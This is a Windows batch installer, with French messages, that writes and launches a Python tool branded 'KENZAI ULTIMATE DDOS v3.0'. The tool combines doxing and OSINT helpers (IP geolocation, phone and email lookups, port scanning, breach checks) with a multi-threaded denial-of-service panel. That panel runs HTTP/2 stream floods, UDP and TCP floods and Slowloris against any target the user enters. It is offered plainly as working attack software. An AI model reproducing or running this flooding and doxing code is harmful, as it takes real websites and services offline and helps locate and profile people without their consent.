@echo off
title KENZAI ULTIMATE DDOS
color 0c
echo ========================================
echo    KENZAI ULTIMATE DDOS v3.0
echo    Installation et lancement automatique
echo ========================================
echo.

:: Vérifier Python
python --version >nul 2>&1
if errorlevel 1 (
    echo [*] Python non trouve. Telechargement...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0.exe' -OutFile '%temp%\python.exe'"
    start /wait %temp%\python.exe /quiet InstallAllUsers=1 PrependPath=1
    del %temp%\python.exe
)

:: Installation des modules
echo [*] Installation des modules...
pip install requests colorama phonenumbers dnspython h2 >nul

:: Création du fichier Python
echo [*] Creation du script...
(
echo #!/usr/bin/env python3
echo # KENZAI ULTIMATE DDOS v3.0
echo.
echo import os, sys, time, json, random, socket, struct, threading, requests, ssl
echo import http.client, h2.connection, h2.config, dns.resolver, phonenumbers
echo from colorama import Fore, Style, init
echo.
echo init(autoreset=True^)
echo os.system('title KENZAI - ULTIMATE DDOS'^)
echo os.system('mode con: cols=110 lines=45'^)
echo.
echo stop_attack = False
echo active_sockets = []
echo.
echo def clear(): os.system('cls'^)
echo.
echo def print_banner(^):
echo     print(f"""
echo {Fore.RED}   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
echo {Fore.RED}   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
echo {Fore.RED}   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
echo {Fore.RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
echo {Fore.RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
echo {Fore.RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{Style.RESET_ALL}
echo {Fore.CYAN}   - KENZAI ULTIMATE DDOS v3.0 -{Style.RESET_ALL}
echo {Fore.YELLOW}   - DOX - OSINT - DDOS 2026 -{Style.RESET_ALL}
echo {Fore.GREEN}┌{'-'*70}┐{Style.RESET_ALL}
echo {Fore.GREEN}│{Fore.CYAN} ULTIME DDOS - VRAI HTTP/2 - MULTI-THREADING{Fore.GREEN}│{Style.RESET_ALL}
echo {Fore.GREEN}└{'-'*70}┘{Style.RESET_ALL}
echo """^)
echo.
echo def menu(^):
echo     print(f"""
echo {Fore.WHITE}[01] IP Locator       [02] Phone Lookup    [03] Email Hunter
echo [04] Username Search  [05] DNS Lookup      [06] Port Scanner
echo [07] Whois Lookup     [08] GeoIP           [09] Breach Check
echo [10] Pastebin Search  [11] Reverse Image   {Fore.RED}[12] DDOS ULTIME{Style.RESET_ALL}
echo [13] Exit
echo.
echo {Fore.YELLOW}[99] Quitter{Style.RESET_ALL}
echo {Fore.CYAN}v3.0 | mode: DDOS ULTIME{Style.RESET_ALL}
echo {Fore.RED}kenzai@ultimate:~/{Style.RESET_ALL} """, end=""^)
echo.
echo def ip_locator(^):
echo     clear(^)
echo     print(f"\n{Fore.CYAN}[01] IP Locator{Style.RESET_ALL}\n"^)
echo     ip = input("IP: "^)
echo     try:
echo         r = requests.get(f"http://ip-api.com/json/{ip}"^)
echo         data = r.json(^)
echo         if data['status'] == 'success':
echo             print(f"\n{Fore.GREEN}IP: {data['query']}\nPays: {data['country']}\nVille: {data['city']}\nLat/Lon: {data['lat']}, {data['lon']}{Style.RESET_ALL}"^)
echo     except: print(f"{Fore.RED}Erreur{Style.RESET_ALL}"^)
echo     input(^)
echo.
echo def phone_lookup(^):
echo     clear(^)
echo     print(f"\n{Fore.CYAN}[02] Phone Lookup{Style.RESET_ALL}\n"^)
echo     phone = input("Numero: "^)
echo     try:
echo         parsed = phonenumbers.parse(phone^)
echo         print(f"{Fore.GREEN}Valide: {phonenumbers.is_valid_number(parsed)}\nPays: {phonenumbers.region_code_for_number(parsed)}{Style.RESET_ALL}"^)
echo     except: print(f"{Fore.RED}Erreur{Style.RESET_ALL}"^)
echo     input(^)
echo.
echo def email_hunter(^):
echo     clear(^); print(f"\n{Fore.CYAN}[03] Email Hunter{Style.RESET_ALL}\n"^)
echo     email = input("Email: "^); print(f"{Fore.GREEN}Email: {email}{Style.RESET_ALL}"^); input(^)
echo.
echo def username_search(^):
echo     clear(^); print(f"\n{Fore.CYAN}[04] Username Search{Style.RESET_ALL}\n"^)
echo     username = input("Username: "^); print(f"{Fore.GREEN}Recherche: {username}{Style.RESET_ALL}"^); input(^)
echo.
echo def dns_lookup(^):
echo     clear(^); print(f"\n{Fore.CYAN}[05] DNS Lookup{Style.RESET_ALL}\n"^)
echo     domain = input("Domaine: "^)
echo     try: print(f"{Fore.GREEN}{domain} -> {socket.gethostbyname(domain)}{Style.RESET_ALL}"^)
echo     except: print(f"{Fore.RED}Erreur{Style.RESET_ALL}"^)
echo     input(^)
echo.
echo def port_scanner(^):
echo     clear(^); print(f"\n{Fore.CYAN}[06] Port Scanner{Style.RESET_ALL}\n"^)
echo     target = input("IP: "^); ports = [80,443,22,21,25,53,3306,8080]
echo     for port in ports:
echo         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM^)
echo         sock.settimeout(0.5^)
echo         if sock.connect_ex((target, port^)^) == 0: print(f"{Fore.GREEN}Port {port}: OPEN{Style.RESET_ALL}"^)
echo         sock.close(^)
echo     input(^)
echo.
echo def whois_lookup(^):
echo     clear(^); print(f"\n{Fore.CYAN}[07] Whois Lookup{Style.RESET_ALL}\n"^)
echo     domain = input("Domaine: "^); print(f"{Fore.GREEN}https://who.is/whois/{domain}{Style.RESET_ALL}"^); input(^)
echo.
echo def geoip(^):
echo     clear(^); print(f"\n{Fore.CYAN}[08] GeoIP{Style.RESET_ALL}\n"^)
echo     ip = input("IP: "^)
echo     try:
echo         r = requests.get(f"https://ipinfo.io/{ip}/json"^)
echo         data = r.json(^)
echo         print(f"{Fore.GREEN}IP: {data.get('ip')}\nVille: {data.get('city')}\nPays: {data.get('country')}{Style.RESET_ALL}"^)
echo     except: print(f"{Fore.RED}Erreur{Style.RESET_ALL}"^)
echo     input(^)
echo.
echo def breach_check(^):
echo     clear(^); print(f"\n{Fore.CYAN}[09] Breach Check{Style.RESET_ALL}\n"^)
echo     email = input("Email: "^)
echo     try:
echo         r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"^)
echo         if r.status_code == 200: print(f"{Fore.RED}Email compromis !{Style.RESET_ALL}"^)
echo         else: print(f"{Fore.GREEN}Aucune fuite{Style.RESET_ALL}"^)
echo     except: print(f"{Fore.GREEN}Erreur{Style.RESET_ALL}"^)
echo     input(^)
echo.
echo def pastebin_search(^):
echo     clear(^); print(f"\n{Fore.CYAN}[10] Pastebin Search{Style.RESET_ALL}\n"^)
echo     query = input("Recherche: "^); print(f"{Fore.GREEN}https://pastebin.com/search?q={query}{Style.RESET_ALL}"^); input(^)
echo.
echo def reverse_image(^):
echo     clear(^); print(f"\n{Fore.CYAN}[11] Reverse Image{Style.RESET_ALL}\n"^)
echo     url = input("URL: "^); print(f"{Fore.GREEN}Google: https://www.google.com/searchbyimage?image_url={url}{Style.RESET_ALL}"^); input(^)
echo.
echo def close_all_sockets(^):
echo     global active_sockets
echo     for sock in active_sockets:
echo         try: sock.close(^)
echo         except: pass
echo     active_sockets.clear(^)
echo.
echo def ddos_ultimate(^):
echo     global stop_attack
echo     clear(^)
echo     print(f"{Fore.RED}"^)
echo     print("╔════════════════════════════════════════════════════════════════════════════╗"^)
echo     print("║                    KENZAI - ULTIME DDOS PANEL 2026                         ║"^)
echo     print("╚════════════════════════════════════════════════════════════════════════════╝"^)
echo     print(f"{Style.RESET_ALL}"^)
echo     print(f"""
echo {Fore.CYAN}[1] HTTP/2 FLOOD   {Fore.WHITE}- VRAI HTTP/2 multi-plexing
echo {Fore.CYAN}[2] UDP FLOOD      {Fore.WHITE}- Multi-threading parallele
echo {Fore.CYAN}[3] TCP FLOOD      {Fore.WHITE}- Connexions TCP rapides
echo {Fore.CYAN}[4] SYN FLOOD      {Fore.WHITE}- RAW sockets (admin requis)
echo {Fore.CYAN}[5] SLOWLORIS      {Fore.WHITE}- Connexions lentes
echo {Fore.CYAN}[6] ALL IN ONE     {Fore.WHITE}- TOUTES methodes ensemble
echo {Style.RESET_ALL}
echo """^)
echo     target = input(f"{Fore.YELLOW}[?] IP ou domaine: {Style.RESET_ALL}"^)
echo     port = int(input(f"{Fore.YELLOW}[?] Port (80/443): {Style.RESET_ALL}"^) or "80"^)
echo     threads = int(input(f"{Fore.YELLOW}[?] Threads (100-2000): {Style.RESET_ALL}"^)^)
echo     duration = int(input(f"{Fore.YELLOW}[?] Duree secondes: {Style.RESET_ALL}"^)^)
echo     method = input(f"{Fore.YELLOW}[?] Methode (1-6): {Style.RESET_ALL}"^)
echo.
echo     try: target_ip = socket.gethostbyname(target^); print(f"{Fore.GREEN}[+] {target} -> {target_ip}{Style.RESET_ALL}"^)
echo     except: target_ip = target
echo.
echo     print(f"\n{Fore.RED}[KENZAI] ATTAQUE LANCEE sur {target_ip}:{port}{Style.RESET_ALL}"^)
echo.
echo     stop_attack = False
echo     close_all_sockets(^)
echo.
echo     def http2_flood(^):
echo         config = h2.config.H2Configuration(client_side=True^)
echo         while not stop_attack:
echo             try:
echo                 conn = h2.connection.H2Connection(config=config^)
echo                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM^)
echo                 sock.settimeout(3^)
echo                 if port == 443:
echo                     context = ssl.create_default_context(^)
echo                     sock = context.wrap_socket(sock, server_hostname=target^)
echo                 sock.connect((target_ip, port^)^)
echo                 active_sockets.append(sock^)
echo                 conn.initiate_connection(^)
echo                 sock.send(conn.data_to_send(^)^)
echo                 for _ in range(500^):
echo                     if stop_attack: break
echo                     stream_id = conn.get_next_available_stream_id(^)
echo                     conn.send_headers(stream_id, [(':method','GET'), (':path','/'+'?'+'x'*random.randint(100,5000^)), (':authority',target^)], end_headers=True^)
echo                     sock.send(conn.data_to_send(^)^)
echo             except: pass
echo.
echo     def udp_flood(^):
echo         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM^)
echo         active_sockets.append(sock^)
echo         while not stop_attack:
echo             try: sock.sendto(random._urandom(1400^), (target_ip, port^)^)
echo             except: pass
echo.
echo     def tcp_flood(^):
echo         while not stop_attack:
echo             try:
echo                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM^)
echo                 sock.settimeout(1^)
echo                 sock.connect((target_ip, port^)^)
echo                 sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode(^) + b"\r\n\r\n"^)
echo                 active_sockets.append(sock^)
echo             except: pass
echo.
echo     def slowloris(^):
echo         try:
echo             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM^)
echo             sock.settimeout(30^)
echo             sock.connect((target_ip, port^)^)
echo             active_sockets.append(sock^)
echo             sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode(^)^)
echo             while not stop_attack:
echo                 sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode(^)^)
echo                 time.sleep(random.uniform(5, 15^)^)
echo         except: pass
echo.
echo     if method == "1":
echo         for _ in range(threads^): threading.Thread(target=http2_flood, daemon=True^).start(^)
echo     elif method == "2":
echo         for _ in range(threads^): threading.Thread(target=udp_flood, daemon=True^).start(^)
echo     elif method == "3":
echo         for _ in range(threads^): threading.Thread(target=tcp_flood, daemon=True^).start(^)
echo     elif method == "4":
echo         print(f"{Fore.YELLOW}[!] SYN Flood necessite admin{Style.RESET_ALL}"^)
echo         for _ in range(threads^): threading.Thread(target=tcp_flood, daemon=True^).start(^)
echo     elif method == "5":
echo         for _ in range(threads^): threading.Thread(target=slowloris, daemon=True^).start(^)
echo     elif method == "6":
echo         t = max(1, threads // 4^)
echo         for _ in range(t^):
echo             threading.Thread(target=http2_flood, daemon=True^).start(^)
echo             threading.Thread(target=udp_flood, daemon=True^).start(^)
echo             threading.Thread(target=tcp_flood, daemon=True^).start(^)
echo             threading.Thread(target=slowloris, daemon=True^).start(^)
echo.
echo     start_time = time.time(^)
echo     while time.time(^) - start_time < duration:
echo         elapsed = int(time.time(^) - start_time^)
echo         remaining = duration - elapsed
echo         active = threading.active_count(^) - 1
echo         sys.stdout.write(f"\r{Fore.YELLOW}[⏱] {elapsed}/{duration}s | Threads: {active}{Style.RESET_ALL}"^)
echo         sys.stdout.flush(^)
echo         time.sleep(1^)
echo.
echo     stop_attack = True
echo     close_all_sockets(^)
echo     print(f"\n\n{Fore.GREEN}[+] Attaque terminee{Style.RESET_ALL}"^)
echo     input(^)
echo.
echo def main(^):
echo     while True:
echo         clear(^); print_banner(^); menu(^)
echo         choice = input(^)
echo         if choice in ["01","1"]: ip_locator(^)
echo         elif choice in ["02","2"]: phone_lookup(^)
echo         elif choice in ["03","3"]: email_hunter(^)
echo         elif choice in ["04","4"]: username_search(^)
echo         elif choice in ["05","5"]: dns_lookup(^)
echo         elif choice in ["06","6"]: port_scanner(^)
echo         elif choice in ["07","7"]: whois_lookup(^)
echo         elif choice in ["08","8"]: geoip(^)
echo         elif choice in ["09","9"]: breach_check(^)
echo         elif choice == "10": pastebin_search(^)
echo         elif choice == "11": reverse_image(^)
echo         elif choice == "12": ddos_ultimate(^)
echo         elif choice in ["13","99"]: print(f"{Fore.RED}Au revoir{Style.RESET_ALL}"^); sys.exit(^)
echo         else: print(f"{Fore.RED}Option invalide{Style.RESET_ALL}"^); time.sleep(1^)
echo.
echo if __name__ == "__main__":
echo     main(^)
) > "%userprofile%\Desktop\kenzai_ultimate.py"

:: Lancement
echo [*] Lancement de KENZAI ULTIMATE...
python "%userprofile%\Desktop\kenzai_ultimate.py"

:: Nettoyage (optionnel)
echo [*] Nettoyage...
del "%userprofile%\Desktop\kenzai_ultimate.py" 2>nul

pause